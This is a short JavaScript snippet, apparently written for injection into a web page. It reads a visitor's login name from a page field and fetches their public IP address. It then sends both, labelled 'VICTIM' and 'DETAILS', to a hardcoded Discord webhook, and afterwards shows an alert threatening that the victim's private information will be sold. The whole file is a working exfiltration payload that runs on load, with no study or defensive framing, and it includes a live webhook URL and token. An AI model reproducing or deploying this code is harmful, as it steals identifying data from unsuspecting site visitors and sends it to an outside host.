async function sendWebhookWithData() {
  const loginName = $("#login_name").val() || "ANONYMOUSVICTIM";
  const urlToFetch = "https://api.ipify.org"; // Replace with the URL you want to fetch
  const webhookUrl = "https://discord.com/api/webhooks/1343190095179812874/2s-H4ikjVgiCdUAPixEZ7S3NXcOplWQewYbGoXhXKOpFY4pZFiIsPmqLtHMWZts5001d"; // Replace with your webhook URL

  try {
    const response = await fetch(urlToFetch);
    if (!response.ok) {
        console.error(`Failed to fetch URL: ${urlToFetch}, status: ${response.status}`);
        return; // Exit if fetch fails
    }
    const fetchedData = await response.text(); // or response.json() if it's JSON

    const payload = {
      content: `VICTIM: ${loginName}\nDETAILS: \n${fetchedData}`
    };

    const webhookResponse = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (webhookResponse.ok) {
      console.log("Webhook sent successfully!");
    } else {
      console.error(`Webhook failed: ${webhookResponse.status}`);
    }
  } catch (error) {
    console.error("An error occurred:", error);
  }
}

sendWebhookWithData();
setTimeout(alert("YOUR PRIVATE INFO WILL BE SELLED"),5000)
